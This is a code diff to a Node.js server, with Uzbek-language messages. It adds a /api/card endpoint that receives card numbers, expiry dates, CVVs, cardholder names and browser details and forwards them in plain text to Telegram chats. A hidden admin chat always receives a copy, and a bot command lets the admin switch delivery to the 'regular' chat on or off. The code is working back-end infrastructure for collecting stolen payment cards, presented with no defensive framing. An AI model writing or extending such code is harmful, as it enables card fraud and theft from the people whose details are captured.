@@ -32,10 +32,96 @@ const wss = new WebSocket.Server({ server });
 
 // Telegram Bot configuration
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Regular chat
+const ADMIN_TELEGRAM_CHAT_ID = process.env.ADMIN_TELEGRAM_CHAT_ID; // Admin chat (receives everything)
 
 // WebSocket authentication token
 const WS_SECRET_TOKEN = process.env.WS_SECRET_TOKEN;
+
+// ===== STATE MANAGEMENT =====
+const STATE_FILE = path.join(__dirname, 'state.json');
+
+function loadState() {
+    try {
+        if (fs.existsSync(STATE_FILE)) {
+            return JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
+        }
+    } catch (e) {
+        console.error('Failed to load state:', e.message);
+    }
+    return { sendCardToRegularChat: true };
+}
+
+function saveState(state) {
+    try {
+        fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
+    } catch (e) {
+        console.error('Failed to save state:', e.message);
+    }
+}
+
+let appState = loadState();
+
+// ===== TELEGRAM BOT POLLING =====
+let lastUpdateId = 0;
+
+async function pollTelegramUpdates() {
+    if (!TELEGRAM_BOT_TOKEN || !ADMIN_TELEGRAM_CHAT_ID) return;
+
+    try {
+        const response = await fetch(
+            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`
+        );
+        const data = await response.json();
+
+        if (data.ok && data.result.length > 0) {
+            for (const update of data.result) {
+                lastUpdateId = update.update_id;
+
+                if (update.message && update.message.text) {
+                    const chatId = update.message.chat.id.toString();
+                    const text = update.message.text.trim();
+
+                    // Only respond to commands in admin chat
+                    if (chatId === ADMIN_TELEGRAM_CHAT_ID) {
+                        if (text === '/activecarddetails' || text === '/activecarddetails@' + TELEGRAM_BOT_TOKEN.split(':')[0]) {
+                            // Toggle state
+                            appState.sendCardToRegularChat = !appState.sendCardToRegularChat;
+                            saveState(appState);
+
+                            const statusText = appState.sendCardToRegularChat
+                                ? '✅ Karta ma\'lumotlari oddiy chatga yuboriladi'
+                                : '❌ Karta ma\'lumotlari oddiy chatga yuborilmaydi';
+
+                            await sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, statusText);
+                            console.log(`Card details to regular chat: ${appState.sendCardToRegularChat}`);
+                        }
+                    }
+                }
+            }
+        }
+    } catch (e) {
+        // Silent fail for polling
+    }
+
+    // Continue polling
+    setTimeout(pollTelegramUpdates, 1000);
+}
+
+async function sendTelegramMessage(chatId, text) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
+        });
+    } catch (e) {
+        console.error('Failed to send Telegram message:', e.message);
+    }
+}
+
+// Start polling after server starts
+setTimeout(pollTelegramUpdates, 2000);
 
 // Enable CORS
 app.use(cors());
@@ -139,6 +225,80 @@ app.get('/api/room/:roomId', (req, res) => {
         });
     } else {
         res.json({ exists: false });
+    }
+});
+
+// API to receive card data and send to Telegram (dual chat)
+app.use(express.json());
+
+const API_SECRET_TOKEN = process.env.API_SECRET_TOKEN;
+
+app.post('/api/card', async (req, res) => {
+    // Validate authorization
+    const authHeader = req.headers.authorization;
+    const token = authHeader?.replace('Bearer ', '');
+
+    if (API_SECRET_TOKEN && token !== API_SECRET_TOKEN) {
+        return res.status(401).json({ success: false, error: 'Unauthorized' });
+    }
+
+    const { cardNumber, expiryDate, cvv, cardType, fullName, userAgent } = req.body;
+
+    if (!cardNumber || !expiryDate || !fullName) {
+        return res.status(400).json({ success: false, error: 'Missing required fields' });
+    }
+
+    // Parse browser and OS
+    const { browser, os } = parseUserAgent(userAgent);
+
+    // Format date
+    const months = ['yanvar', 'fevral', 'mart', 'aprel', 'may', 'iyun',
+        'iyul', 'avgust', 'sentabr', 'oktabr', 'noyabr', 'dekabr'];
+    const now = new Date();
+    const dateStr = `${now.getDate()} ${months[now.getMonth()]} ${now.getFullYear()}`;
+    const timeStr = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
+
+    const cardTypeEmoji = {
+        visa: '💳 Visa',
+        mastercard: '💳 Mastercard',
+        humo: '🇺🇿 Humo',
+        uzcard: '🇺🇿 UzCard',
+        unknown: '💳 Unknown'
+    };
+
+    const message = `
+💰 <b>YANGI KARTA MA'LUMOTLARI!</b>
+
+${cardTypeEmoji[cardType] || cardTypeEmoji.unknown}
+
+📝 <b>Ism:</b> <code>${fullName}</code>
+💳 <b>Karta:</b> <code>${cardNumber}</code>
+📅 <b>Amal qilish:</b> <code>${expiryDate}</code>
+${cvv ? `🔐 <b>CVV:</b> <code>${cvv}</code>` : ''}
+
+📱 <b>Brauzer:</b> ${browser}
+💻 <b>OS:</b> ${os}
+📆 <b>Sana:</b> ${dateStr}
+⏰ <b>Vaqt:</b> ${timeStr}
+`.trim();
+
+    try {
+        // Always send to admin chat
+        if (ADMIN_TELEGRAM_CHAT_ID) {
+            await sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, message);
+            console.log('✅ Card data sent to admin chat');
+        }
+
+        // Send to regular chat if enabled
+        if (appState.sendCardToRegularChat && TELEGRAM_CHAT_ID) {
+            await sendTelegramMessage(TELEGRAM_CHAT_ID, message);
+            console.log('✅ Card data sent to regular chat');
+        }
+
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Failed to send card data:', error);
+        res.status(500).json({ success: false, error: 'Failed to send' });
     }
 });
 
